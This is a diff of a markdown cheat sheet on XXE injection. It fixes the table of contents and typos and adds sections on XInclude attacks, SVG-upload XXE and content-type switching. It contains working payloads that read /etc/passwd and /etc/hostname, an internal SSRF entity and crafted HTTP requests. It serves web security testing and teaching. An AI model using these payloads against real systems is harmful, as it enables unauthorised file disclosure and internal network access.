@@ -5,16 +5,22 @@ XXE (XML External Entity) is a vulnerability that occurs when an attacker can ma
 ### Table of content 
 
 - [XML](#xml)
-    - [Document type definition](#document-type-definition)
-    - [XML entities](#xml-entities)
+  - [Document type definition](#document-type-definition)
+  - [XML entities](#xml-entities)
+- [Find and Test for XXE](#find-and-test-xxe)
 - **Exploit**
-    - [Retrieve files](#retrieve-files)
-    - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
-    - [Blind XEE](#blind-xee-vuln)
-      - [Detecting blind XXE using out-of-band (OAST) techniques](#detecting-blind-xxe-using-out-of-band-oast-techniques)
-      - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
-      - [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
-      - [Exploiting blind XXE by repurposing a local DTD](#exploiting-blind-xxe-by-repurposing-a-local-dtd)
+  - [Retrieve files](#retrieve-files)
+  - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
+  - [Blind XXE](#blind-xxe-vuln)
+    - [Detecting blind XXE using out-of-band (OAST) techniques](#detecting-blind-xxe-using-out-of-band-oast-techniques)
+    - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
+    - [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
+    - [Exploiting blind XXE by repurposing a local DTD](#exploiting-blind-xxe-by-repurposing-a-local-dtd)
+  - [Finding hidden attack surface for XXE injection](#finding-hidden-attack-surface-for-xxe-injection)
+    - [Xinclude attacks](#xinclude-attacks)
+    - [XXE attacks via file upload](#xxe-attacks-via-file-upload)
+    - [XXE attacks via modified content type](#xxe-attacks-via-modified-content-type)
+
 ## XML
 
 XML (Extensible Markup Language) is a versatile and structured markup language used for storing, transporting, and exchanging data. It's known for its human-readable format and plays a critical role in various web technologies and data storage solutions. Its popularity has now declined in favor of the JSON format.
@@ -59,6 +65,19 @@ The URL can use the file:// protocol, and so external entities can be loaded fro
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
 ```
 
+## Find and test XXE
+
+The vast majority of XXE vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.
+
+Manually testing for XXE vulnerabilities generally involves:
+
+- Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
+- Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator is perfect for this purpose.
+- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.
+
+
+*Keep in mind that XML is just a data transfer format. Make sure you also test any XML-based functionality for other vulnerabilities like XSS and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to obfuscate your attack in order to bypass weak defences.*
+
 ## Exploit
 
 ## Retrieve files
@@ -99,7 +118,7 @@ To exploit an XXE vulnerability to perform an SSRF attack, you need to define an
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 ```
 
-## Blind XEE vuln
+## Blind XXE vuln
 
 Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.
 
@@ -233,6 +252,64 @@ After you have tested a list of common DTD files to locate a file that is presen
 %local_dtd;
 ]>
 ```
+
+## Finding hidden attack surface for XXE injection
+
+If you look in the right places, you will find XXE attack surface in requests that do not contain any XML.
+
+### XInclude attacks
+
+Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.
+
+In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.
+
+To try if XML is interpreted and inject our payload you can try inject a entities `%26entities;`, if it return an error, it has been interpreted by backend.
+
+To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For example:
+
+```html
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+### XXE attacks via file upload
+
+Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.
+
+```html
+------WebKitFormBoundaryqAQ2NvZeTOUDZuMl
+Content-Disposition: form-data; name="avatar"; filename="SVG_Logo.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+### XXE attacks via modified content type
+
+Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.
+
+For example, if a normal request contains the following:
+
+```html
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+Then you might be able submit the following request, with the same result:
+
+
+```html
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+
+If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.
 
 ---
 
